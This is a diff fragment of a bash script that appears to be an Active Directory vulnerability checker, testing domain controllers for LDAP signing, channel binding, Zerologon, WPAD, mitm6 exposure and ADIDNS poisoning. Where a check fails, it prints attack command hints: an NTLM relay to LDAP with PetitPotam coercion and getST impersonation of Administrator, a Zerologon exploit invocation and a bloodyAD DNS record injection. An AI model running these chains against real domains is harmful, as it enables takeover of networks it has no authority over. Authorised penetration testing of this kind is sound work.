+  done < "$OUTPUT_DIR/all_dcs.txt"
+  if [ $VULN_COUNT -gt 0 ]; then
+    if [ $VULN_COUNT -eq $DC_COUNT ]; then
+      echo -e "${RED}[KO] All $DC_COUNT DCs: NTLMv2 LDAP Signing + LDAPS Channel Binding NOT enforced → ldap_security_check.csv${NC}"
+    else
+      echo -e "${RED}[KO] $VULN_COUNT/$DC_COUNT DC(s) without NTLMv2 LDAP Signing + LDAPS Channel Binding → ldap_security_check.csv${NC}"
+      printf "$VULN_DCS"
+    fi
+    FIRST_VULN_LDAP_DC_IP=$(awk -F',' 'NR==2 {print $2}' "$OUTPUT_DIR/ldap_security_check.csv")
+    if [ "$RELAY_COUNT" -gt 0 ]; then
+      echo -e "${GREY}       └─ 1) ntlmrelayx.py -t ldap://${FIRST_VULN_LDAP_DC_IP} --remove-mic --delegate-access${NC}"
+      echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <RELAY_IP> ${FIRST_VULN_LDAP_DC_IP}${NC}"
+      echo -e "${GREY}          3) getST.py -spn cifs/${FIRST_VULN_LDAP_DC_IP} '$DOMAIN'/\$MACHINE\$ -impersonate Administrator${NC}"
+    else
+      echo -e "${GREEN}       └─ Not exploitable: No relay targets without SMB Signing found${NC}"
+    fi
   else
-    echo -e "${GREY}[--] Zerologon check inconclusive${NC}"
+    echo -e "${GREEN}[OK] NTLMv2 LDAP Signing + LDAPS Channel Binding on all DCs enforced${NC}"
   fi
-fi
-
-# WPAD
-WPAD_DNS=$(nslookup wpad.$DOMAIN $DC_IP 2>&1)
-if echo "$WPAD_DNS" | grep -q "can't find"; then
-  echo -e "${RED}[KO] No WPAD DNS entry (WPAD Poisoning)${NC}"
 else
-  echo -e "${GREEN}[OK] WPAD DNS entry exists${NC}"
-fi
-
-# IPv6 DNS Check
-IPV6_ENABLED=$(dig +short AAAA $DC_HOSTNAME 2>/dev/null)
-if [ -z "$IPV6_ENABLED" ]; then
-  echo -e "${RED}[KO] No IPv6 DNS record for DC (DHCPv6 DNS Takeover via mitm6)${NC}"
-else
-  echo -e "${GREEN}[OK] IPv6 DNS configured for DC${NC}"
-fi
-
-# ADIDNS Poisoning Check
-ADIDNS_OUTPUT=$(dacledit.py -action read -target-dn "DC=$DOMAIN,CN=MicrosoftDNS,DC=DomainDnsZones,$DOMAIN_DN" -dc-ip $DC_IP "$FULL_USER:$PASSWORD" 2>/dev/null)
-ADIDNS_CREATECHILD=$(echo "$ADIDNS_OUTPUT" | awk '
-  /Access mask.*CreateChild/ { found=1; next }
-  found && /Trustee/ {
-    if ($0 !~ /Domain Admins|Enterprise Admins|Administrators|Local System|DnsAdmins|Enterprise Domain Controllers/) {
-      sub(/.*Trustee \(SID\)\s*:\s*/, ""); print
-    }
-    found=0
-  }
-' | sort -u)
-if [ ! -z "$ADIDNS_CREATECHILD" ]; then
-  ADIDNS_TRUSTEES=$(echo "$ADIDNS_CREATECHILD" | tr '\n' ',' | sed 's/,$//')
-  echo -e "${RED}[KO] ADIDNS poisoning possible with $ADIDNS_TRUSTEES${NC}"
-  echo -e "${GREY}       └─ bloodyAD -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' --host $DC_IP add dnsRecord <hostname> <YOUR_IP>${NC}"
-else
-  echo -e "${GREEN}[OK] ADIDNS zone write access is restricted${NC}"
+  LDAP_CHECK=$(netexec ldap $DC_IP -u "$AD_USER" -p "$PASSWORD" 2>/dev/null)
+  LDAP_SIGNING=$(echo "$LDAP_CHECK" | grep -oP 'signing:\K\w+')
+  LDAP_CB=$(echo "$LDAP_CHECK" | grep -oP 'channel binding:\K\S+')
+  if [ "$LDAP_SIGNING" = "None" ] && [[ "$LDAP_CB" =~ ^(No|Never) ]]; then
+    echo -e "${RED}[KO] NTLMv2 LDAP Signing + LDAPS Channel Binding NOT enforced${NC}"
+    if [ "$RELAY_COUNT" -gt 0 ]; then
+      echo -e "${GREY}       └─ 1) ntlmrelayx.py -t ldap://${DC_IP} --remove-mic --delegate-access${NC}"
+      echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <RELAY_IP> ${DC_IP}${NC}"
+      echo -e "${GREY}          3) getST.py -spn cifs/${DC_IP} '$DOMAIN'/\$MACHINE\$ -impersonate Administrator${NC}"
+    else
+      echo -e "${GREEN}       └─ Not exploitable: No relay targets without SMB Signing found${NC}"
+    fi
+  elif [ "$LDAP_SIGNING" = "None" ]; then
+    echo -e "${RED}[KO] NTLMv2 LDAP Signing NOT enforced${NC}"
+    echo -e "${GREEN}       └─ Not Exploitable: LDAPS Channel Binding enabled${NC}"
+  elif [[ "$LDAP_CB" =~ ^(No|Never) ]]; then
+    echo -e "${RED}[KO] NTLMv2 LDAP Channel Binding NOT enforced${NC}"
+    echo -e "${GREEN}       └─ Not Exploitable: LDAP Signing enabled${NC}"
+  else
+    echo -e "${GREEN}[OK] NTLMv2 LDAP Signing + LDAPS Channel Binding enforced${NC}"
+  fi
 fi
 
 echo ""
@@ -841,6 +836,21 @@ CONTAINER_NAME=$(hostname)
 cd "$CURRENT_PATH"
 
 echo ""
+
+# Zerologon (CVE-2020-1472)
+if [ ! -z "$DC_BUILD" ] && [ "$DC_BUILD" -ge 17763 ]; then
+  echo -e "${GREEN}[OK] Zerologon (CVE-2020-1472) not vulnerable (Build $DC_BUILD ≥ 17763)${NC}"
+else
+  ZERO_OUTPUT=$(nxc smb $DC_IP -u "$AD_USER" -p "$PASSWORD" -M zerologon 2>/dev/null)
+  if echo "$ZERO_OUTPUT" | grep -q "VULNERABLE"; then
+    echo -e "${RED}[KO] Zerologon (CVE-2020-1472) vulnerable${NC}"
+    echo -e "${GREY}       └─ /opt/tools/zerologon/venv/bin/python3 /opt/tools/zerologon/zerologon-exploit/cve-2020-1472-exploit.py $DC_HOSTNAME $DC_IP${NC}"
+  elif echo "$ZERO_OUTPUT" | grep -q "Attack failed"; then
+    echo -e "${GREEN}[OK] Zerologon (CVE-2020-1472) not vulnerable${NC}"
+  else
+    echo -e "${GREY}[--] Zerologon check inconclusive${NC}"
+  fi
+fi
 
 # MDT Detection
 MDT_OUTPUT=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" -b "$DOMAIN_DN" "(objectclass=intellimirrorSCP)" cn netbootServer 2>/dev/null)
